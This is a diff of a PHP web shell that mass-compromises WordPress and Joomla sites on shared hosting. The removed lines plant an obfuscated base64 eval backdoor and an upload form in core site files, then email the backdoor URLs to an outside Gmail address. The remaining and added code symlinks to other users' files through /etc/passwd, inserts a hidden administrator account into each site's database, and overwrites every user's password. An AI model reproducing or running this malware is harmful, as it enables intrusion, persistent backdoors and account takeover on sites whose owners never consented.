@@ -2,84 +2,13 @@
         //error_reporting(0);
         ini_set("max_execution_time",0);
         session_start();
-        if(@$_GET["3x"]=="3x") {
-     echo '<form action="" method="post" enctype="multipart/form-data">
-      <input type="file" name="up"/>
-      <input type="submit" name="submit" value="Submit" />
-     </form>';
-     if ($_POST["submit"]) {
-         move_uploaded_file($_FILES["up"]["tmp_name"],$_FILES["up"]["name"]);
-         $url=$_FILES["up"]["name"];
-         echo "<h1><a href='$url'>Open Shell!</a></h1>";
-       }
-    }
-    if(!isset($_SESSION["3xbeast"])) {
-        $_SESSION["3xbeast"] = true;
 
-        
 
-                  
-
-            $root=$_SERVER["DOCUMENT_ROOT"];
-            if(file_exists($root."/index.php") OR file_exists($root."/configuration.php") OR file_exists($root."/wp-config.php")) {
-            $index=file_get_contents($root."/index.php");
-            $configuration=file_get_contents($root."/configuration.php");
-            $wpconfig=file_get_contents($root."/wp-config.php");
-            if(!empty($index)) {
-               $index=str_replace(base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"),"",$index);
-               link($root."/index.php",$root."/index.php.bak");
-               unlink($root."/index.php");
-               $opindex=fopen($root."/index.php","a");
-               fwrite($opindex,base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"));
-               fwrite($opindex,$index);
-               fclose($opindex);
-               $indexback=$_SERVER['SERVER_NAME']."/index.php?3x=3x";
-            }
-            if(!empty($configuration)) {
-               $configuration=str_replace(base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"),"",$config);
-               link($root."/configuration.php",$root."/configuration.php.bak");
-               unlink($root."/configuration.php");
-               $opcon=fopen($root."/configuration.php","a");
-               fwrite($opcon,base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"));
-               fwrite($opcon,$configuration);
-               fclose($opcon);
-               $configurationback=$_SERVER['SERVER_NAME']."/configuration.php?3x=3x";
-            }
-            if(!empty($wpconfig)) {
-               $wpconfig=str_replace(base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"),"",$wpconfig);
-               if(is_dir($root."/wp-admin")) {
-                  chdir($root."wp-admin");
-                  if(!empty("about.php")) {
-                  $about=file_get_contents($root."/wp-admin/about.php");
-                  $about=str_replace(base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"),"",$about);
-                  unlink($root."/wp-admin/about.php");
-                  $opabout=fopen($root."/wp-admin/about.php","a");
-                  fwrite($opabout,base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"));
-                  fwrite($opabout,$about);
-                  fclose($opabout);
-                  $wpadminback=$_SERVER['SERVER_NAME']."/wp-admin/about.php?3x=3x";
-                  }
-               } else {
-                  link($root."/wp-config.php",$root."/wp-config.bak");
-                  unlink($root."/wp-config.php");
-                  $opwpcon=fopen($root."/wp-config.php","a");
-                  fwrite($opwpcon,base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"));
-                  fwrite($opwpcon,$wpconfig);
-                  fclose($opwpcon);
-                  $wpconfigback=$_SERVER['SERVER_NAME']."/wp-config.php?3x=3x";
-               }
-            }
-            $mailme="13shell37@gmail.com";
-            $subject="3xBeast";
-            $bodyme=$indexback."\n".$configurationback."\n".$wpconfigback."\n".$wpadminback;
-            mail($mailme,$subject,$bodyme);
-            }
-    }
         function sym() //symlinker function
         {
                 $dir = file("/etc/passwd");
-                mkdir("3x_beast", 0755);
-                chdir("3x_beast");
+                mkdir("spyMassWp", 0755);
+                chdir("spyMassWp");
                 $ht   = 'Options Indexes FollowSymLinks
               DirectoryIndex achon666ju5t.extremecrew
               AddType txt .php
@@ -161,10 +90,10 @@
         function wpmass()
         {
             $_total_done = 0;
-            $_path = getcwd() . "/3x_beast/";
+            $_path = getcwd() . "/spyMassWp/";
                 $url  = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";
                 $url = str_replace(basename($_SERVER["SCRIPT_FILENAME"]), "", $url);
-                $url  = $url . "/3x_beast/";
+                $url  = $url . "/spyMassWp/";
                 $curl = curl_init();
                 curl_setopt($curl, CURLOPT_URL, $url);
                 curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
@@ -217,7 +146,7 @@
                         }
                         $connect = mysqli_connect($host, $user, $password, $name);
                         if ($connect) {
-                            $qr1=mysqli_query($connect,"INSERT INTO `".$prefix."users` (`user_login`, `user_pass`, `user_nicename`, `user_email`, `user_status`) VALUES ('Beast3x', 'c7433bf0630d8def04ad22c9f5308783', 'firstname lastname', 'email@example.com', '0');");
+                            $qr1=mysqli_query($connect,"INSERT INTO `".$prefix."users` (`user_login`, `user_pass`, `user_nicename`, `user_email`, `user_status`) VALUES ('spyv2', '21232f297a57a5a743894a0e4a801fc3', 'firstname lastname', 'email@example.com', '0');");
                             $qr2=mysqli_query($connect,"INSERT INTO `".$prefix."usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, (Select max(id) FROM ".$prefix."users), '".$prefix."capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}');");
                             $qr3=mysqli_query($connect,"INSERT INTO `".$prefix."usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, (Select max(id) FROM ".$prefix."users), '".$prefix."user_level', '10');");
                             $qr4=mysqli_query($connect,"SELECT `option_value` FROM `".$prefix."options` WHERE `option_name`='siteurl'");
@@ -237,7 +166,7 @@
                                 $query2 = mysqli_query($connect,"update ".$prefix."users set user_login='Admin',user_pass='c7433bf0630d8def04ad22c9f5308783'");
                                 if($query2){
                                     $_total_done++;
-                                    echo "$siteeurl|spyv2|spyv2@12<br>";
+                                    echo "$siteeurl|spyv2|admin<br>";
                                 }
                             }
                         }
